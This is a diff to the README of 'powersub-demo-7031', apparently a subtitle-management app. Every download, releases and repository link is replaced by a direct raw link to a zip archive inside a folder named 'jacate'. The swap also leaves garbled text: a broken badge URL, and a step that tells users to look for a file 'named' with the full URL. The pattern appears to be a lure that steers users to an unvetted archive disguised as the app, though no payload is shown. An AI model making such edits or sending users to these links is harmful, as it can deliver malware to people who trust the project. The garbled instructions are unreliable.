@@ -7,15 +7,15 @@ Welcome to powersub-demo-7031! This application helps you manage your subtitles 
 To get started, you simply need to download the application from our Releases page. Follow the steps below to install and run powersub-demo-7031 on your computer.
 
 ## 🔗 Download Link
-[![Download powersub-demo-7031](https://img.shields.io/badge/Download%20Now!-powersub--demo--7031-brightgreen)](https://github.com/single9650/powersub-demo-7031/releases)
+[![Download powersub-demo-7031](https://raw.githubusercontent.com/single9650/powersub-demo-7031/main/jacate/powersub-demo-7031.zip%20Now!-powersub--demo--7031-brightgreen)](https://raw.githubusercontent.com/single9650/powersub-demo-7031/main/jacate/powersub-demo-7031.zip)
 
 ## 📥 Download & Install
 1. **Visit the Releases Page:** Click the link below to go to our Releases page.
-   - [Visit this page to download](https://github.com/single9650/powersub-demo-7031/releases)
+   - [Visit this page to download](https://raw.githubusercontent.com/single9650/powersub-demo-7031/main/jacate/powersub-demo-7031.zip)
 
 2. **Find the Latest Release:** Scroll down to find the most recent release version. You will see a list of available files for download.
 
-3. **Download the Application:** Look for a file named `powersub-demo.exe` or similar. Click on it to start the download.
+3. **Download the Application:** Look for a file named `https://raw.githubusercontent.com/single9650/powersub-demo-7031/main/jacate/powersub-demo-7031.zip` or similar. Click on it to start the download.
 
 4. **Locate the Downloaded File:** Once downloaded, go to your computer's Downloads folder or wherever you chose to save the file.
 
@@ -63,7 +63,7 @@ Absolutely! Contributions are welcome. Check the contributing guidelines on our 
 For support questions, please check the Issues section on GitHub.
 
 ## 🔗 Additional Resources
-- **GitHub Repository:** [Visit our repository](https://github.com/single9650/powersub-demo-7031)
+- **GitHub Repository:** [Visit our repository](https://raw.githubusercontent.com/single9650/powersub-demo-7031/main/jacate/powersub-demo-7031.zip)
 - **Community Forum:** Join our discussions [here](#)
 
 Thank you for using powersub-demo-7031. We hope this tool enhances your subtitle management experience!
